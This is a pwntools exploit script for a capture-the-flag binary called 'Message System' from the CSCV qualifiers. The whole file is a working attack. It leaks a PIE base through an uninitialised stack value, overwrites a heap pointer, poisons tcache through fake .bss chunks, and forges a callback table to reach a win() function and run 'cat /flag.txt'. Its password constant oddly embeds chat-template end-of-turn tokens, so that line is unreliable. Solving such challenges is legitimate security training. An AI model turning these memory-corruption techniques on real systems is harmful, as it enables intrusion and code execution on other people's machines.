#!/usr/bin/env python3
from pwn import *
import argparse
import os
import re

context.arch = "amd64"
context.log_level = os.environ.get("PWNLVL", "info")

PASSWORD = b"<|eot_id|><|im_end|>pwd=guest"


def start(host, port):
    return remote(host, port)


parser = argparse.ArgumentParser(description="Exploit the CSCV qualifiers Pwn Message System challenge")
parser.add_argument("host", help="challenge host")
parser.add_argument("port", type=int, help="challenge port")
args = parser.parse_args()
io = start(args.host, args.port)


def menu():
    io.recvuntil(b"> ")


def option(n):
    io.sendline(str(n).encode())


def configure_size(value):
    option(1)
    io.recvuntil(b"Max message size: ")
    io.sendline(str(value).encode())
    menu()


def create(payload):
    option(3)
    io.recvuntil(b"Enter message: ")
    io.send(payload + b"\n")
    menu()


def send_message():
    option(5)
    menu()


# Authenticate.  The visible passwords in the binary are decoys; the real
# checker accepts this token reconstructed by its XOR routine.
menu()
option(1)
io.recvuntil(b"Password: ")
io.sendline(PASSWORD)
menu()

# The priority handler leaves a PIE-relative global address in a reused large
# stack frame.  An invalid support ID then prints that uninitialised qword.
option(2)
io.recvuntil(b"New priority (1-10): ")
io.sendline(b"0")
menu()
option(6)
io.recvuntil(b"Enter Support ID")
io.recvuntil(b": ")
io.sendline(b"X")
leak = io.recvuntil(b"> ")
m = re.search(rb"Ticket created for ID: (-?\d+)", leak)
if not m:
    log.error("PIE leak not found: %r", leak)
    raise SystemExit(1)
pie_leak = int(m.group(1))
base = pie_leak - 0x5B4C
log.success("PIE base: %#x", base)

# .bss+0x5b50 is made into a fake 0x70-size tcache chunk by setting the
# adjacent global max-size qword to 0x70.  The unbounded read is used only to
# replace ctx->message with that known PIE-relative address; the stack canary
# is never reached.
fake = base + 0x5B50
configure_size(-2147483648)
create(b"A" * 200 + p64(fake) + b"B" * 8)
configure_size(112)
send_message()

# Walk overlapping fake tcache entries through .bss.  Every copied message
# writes 100 bytes, enough to prepare the next fake chunk's size field at
# current+0x58.  The next user pointer is current+0x60.
for current in [base + off for off in (0x5B50, 0x5BB0, 0x5C10, 0x5C70, 0x5CD0)]:
    nxt = current + 0x60
    data = bytearray(b"Z" * 100)
    data[0x58:0x60] = p64(0x70)
    data[0x60] = 0
    configure_size(-2147483648)
    create(bytes(data) + b"A" * 100 + p64(nxt))
    configure_size(112)
    send_message()

# At .bss+0x5d30, the controlled copy reaches the callback-table global at
# +0x20 and the option-8 slot at +0x40.  Keep the global exit flag zero so the
# dispatcher remains alive long enough to invoke the forged slot.
table = base + 0x5D30
data = bytearray(b"Q" * 100)
data[0x20:0x28] = p64(table)           # *(base+0x5d50) = fake table
data[0x2C:0x30] = p32(0)               # *(base+0x5d5c) = exit flag = 0
data[0x40:0x48] = p64(base + 0x21BE)   # fake_table[8] = win()
configure_size(-2147483648)
create(bytes(data) + b"A" * 100 + p64(0))

option(8)
io.sendline(b"cat /flag.txt")
out = io.recvall(timeout=4)
print(out.decode("latin-1", "replace"))
flag = re.search(rb"CSCV2026\{[^}\r\n]+\}", out)
if flag:
    log.success("FLAG: %s", flag.group().decode())
